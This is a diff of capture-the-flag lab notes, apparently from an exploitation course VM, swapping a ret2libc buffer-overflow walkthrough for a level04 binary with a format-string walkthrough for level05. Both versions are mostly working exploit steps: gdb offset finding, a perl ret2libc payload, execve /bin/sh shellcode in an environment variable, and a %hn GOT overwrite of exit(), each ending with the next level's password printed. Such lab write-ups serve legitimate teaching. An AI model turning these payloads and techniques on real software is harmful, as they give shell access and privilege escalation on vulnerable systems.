@@ -1,65 +1,86 @@
-1. ssh level03@192.168.56.101 -p 4242
+1. ssh level05@192.168.56.101 -p 4242
 2. ls -la
-3. ./level04
-    << Give me some shellcode, k
-    >> a
-    << child is exiting...
+3. ./level05
+    >> asdfa
+    << asdfa
+    
+    ./level05
+    >> qwe123
+    << qwe123
 
-    >> Give me some shellcode, k
-    << Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-
-Hmm... Interesting, no crash, no exit
-
-4. scp -P 4242 level04@192.168.56.101:/home/users/level04/level04 .
+4. scp -P 4242 level05@192.168.56.101:/home/users/level05/level05 .
 5. open /Application/IDA Freeware 7.7/ida64.app
-6. analyze level04 ELF binary ->
+6. analyze level05 ELF binary ->
+    mov     dword ptr [esp+4], 64h ; 100 byte buffer (for fgets)
     ...
-    call    _fork
+    call    _fgets
     ...
-    call    _ptrace
-    mov     dword ptr [esp], offset aGiveMeSomeShel ; "Give me some shellcode, k"
-    call    _puts
+    ; [A-Z] checks, to [a-z] transformation
     ...
-    call    _gets
+    call    _printf
+    mov     dword ptr [esp], 0
+    call    _exit
+ 
+First of all, we have _printf to abuse
+
+7. Test asm research
+    ./level05
+    >> DaN@cSu.Edu
+    << dan@csu.edu
+
+    OK, Really transforming letters
     
-We can really give it some shellcode (thanks to gets function)
+    ./level05
+    >> %1$p
+    << 0x64
+    >> %2$p
+    << 0xf7fcfac0
 
-7. Find EIP offset
-    gdb level04
-    (gdb) set follow-fork-mode child ;; We need to follow forked child in gdb to monitor gets EIP offset
-    (gdb) r
-    Program received signal SIGSEGV, Segmentation fault.
-    [Switching to process 1739]
-    0x41326641 in ?? ()
+    printf is not protected, good
 
-EIP offset is 156
+8. Let's print what we put with %n$p pattern
+    >> perl -e 'print "A" x 4; print map { "$_|%$_\$p." } (1..100)' | cat - | ./level05
+    << aaaa1|0x64.2|0xf7fcfac0.3|0xf7ec3af9.4|0xffffd67f.5|0xffffd67e.6|(nil).7|0xffffffff.8|0xffffd704.9|0xf7fdb000.10|0x61616161.11|0x31257c31.12|0x322e7024.13|%1
 
-8. Really give it shellcode
-    But we need to construct it?
-    Yes, using the foolish system("/bin/sh") and exit() after it
+Catch it! >> 10|0x61616161 -> %10$p -> we can exploit it with ENV variable stored at 10th position
+
+9. It's time to `exit()`
+All we have:
+ - Exploitable printf
+ - Environment variable could contain shellcode
+ - exit() GOT address
+
+Plan: spoof exit() GOT address with shellcode (env var) address using printf modifier
+
+????
+
+10. exit() GOT address
+    >> gdb ./level05
+    >> (gdb) info address exit
+    << 0x8048370
+    >> x/i 0x8048370
     
-    (gdb) r
-
-    (gdb) p system
-    $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-
-    (gdb) p exit
-    $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
-
-    (gdb) info proc map
-    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
-
-    (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
-    0xf7f897ec
-
-    So, 0xf7e6aed0 (system), 0xf7e5eb70 (exit), 0xf7f897ec ("/bin/sh")
-
-9. Exploit
-    perl -e 'print "A"x156 . "\xd0\xae\xe6\xf7" . "\x70\xeb\xe5\xf7" . "\xec\x97\xf8\xf7" . "\n"' > /tmp/exploit
-    cat /tmp/exploit - | ./level04
+0x80497e0
+ 
+11. Environment address
+    >> env -i EXPLOIT=$(perl -e 'print "\x90" x 1000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') gdb level05
+    >> (gdb) r
+    Ctrl+C
+    >> (gdb) x/1000s environ
     ...
-    cat /home/users/level05/.pass
+    
+0xffffdc70
 
-    3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+13. Oops... 0xffffdc70 too long, let's divide it
+    56432 - 0x^^^^^^^^[8] = 56424
+    65535 - 56432 = 9103
+    
+perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%56424d" . "%10$hn" . "%9103d" . "%11$hn"'
 
-OK.   
+14. Inject
+    >> (perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%56424d" . "%10\$hn" . "%9103d" . "%11\$hn"'; cat) | env -i EXPLOIT=$(perl -e 'print "\x90" x 1000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') ./level05
+    >> whoami
+    << level06
+    >> cat /home/users/level06/.pass
+    
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
